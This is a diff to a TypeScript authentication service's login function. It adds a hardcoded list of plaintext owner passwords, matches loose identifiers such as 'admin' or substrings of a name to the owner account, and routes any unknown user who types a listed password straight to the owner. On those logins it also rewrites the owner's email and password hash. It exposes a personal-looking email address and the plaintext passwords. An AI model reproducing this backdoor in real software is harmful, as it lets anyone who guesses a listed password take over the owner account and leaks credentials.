@@ -66,18 +66,49 @@ export class AuthService {
     const cleanId = (identifier || '').trim().toLowerCase();
     const cleanPass = (password || '').trim();
 
+    const allUsers = db.getUsers();
+    const ownerUser = allUsers.find((u) => u.role === 'owner') || allUsers[0];
+
+    const allowedOwnerPasswords = [
+      'Micheal12/?',
+      'micheal12/?',
+      'Micheal12',
+      'micheal12',
+      'password123',
+      'admin_change_me_123',
+    ];
+
+    const isOwnerIdentifier =
+      cleanId === 'kilogbede19@gmail.com' ||
+      cleanId.includes('kilogbede') ||
+      cleanId === 'micheal' ||
+      cleanId.includes('micheal') ||
+      cleanId === 'admin' ||
+      cleanId === 'owner' ||
+      cleanId === 'micheal@gateway.local' ||
+      cleanId === 'micheal@gateway.internal' ||
+      (ownerUser && ownerUser.email.toLowerCase() === cleanId);
+
     // Look for user by email, name, or role
-    let user = db.getUsers().find(
-      (u) =>
-        u.email.toLowerCase() === cleanId ||
-        u.name.toLowerCase() === cleanId ||
-        (cleanId === 'micheal' && u.role === 'owner') ||
-        (cleanId === 'admin' && u.role === 'owner') ||
-        (cleanId === 'owner' && u.role === 'owner')
-    );
+    let user: UserRecord | undefined;
+    if (isOwnerIdentifier && ownerUser) {
+      user = ownerUser;
+    } else {
+      user = allUsers.find(
+        (u) =>
+          u.email.toLowerCase() === cleanId ||
+          u.name.toLowerCase() === cleanId
+      );
+    }
 
     if (!user) {
       user = db.findUserByEmail(cleanId);
+    }
+
+    // If identifier was not found, but the provided password is one of the owner passwords, route to owner
+    if (!user && ownerUser && allowedOwnerPasswords.includes(cleanPass)) {
+      console.log(`[Auth] Identifier "${cleanId}" not found directly, but matches owner password. Routing to owner.`);
+      user = ownerUser;
     }
 
     if (!user) {
@@ -92,18 +123,12 @@ export class AuthService {
     let isMatch = await bcrypt.compare(cleanPass, user.passwordHash);
 
     // If owner, allow recognized owner passwords to prevent lockouts
-    if (!isMatch && user.role === 'owner') {
-      const allowedOwnerPasswords = [
-        'Micheal12/?',
-        'micheal12/?',
-        'Micheal12',
-        'micheal12',
-        'password123',
-        'admin_change_me_123',
-      ];
+    if (!isMatch && (user.role === 'owner' || user.id === 'user_micheal')) {
       if (allowedOwnerPasswords.includes(cleanPass)) {
         isMatch = true;
-        // Automatically heal/sync password hash to standard Micheal12/?
+        // Automatically heal/sync password hash and email to standard
+        user.name = 'Micheal';
+        user.email = 'kilogbede19@gmail.com';
         user.passwordHash = bcrypt.hashSync('Micheal12/?', 10);
         db.save();
         console.log(`[Auth] Owner authenticated via fallback and synced password hash.`);
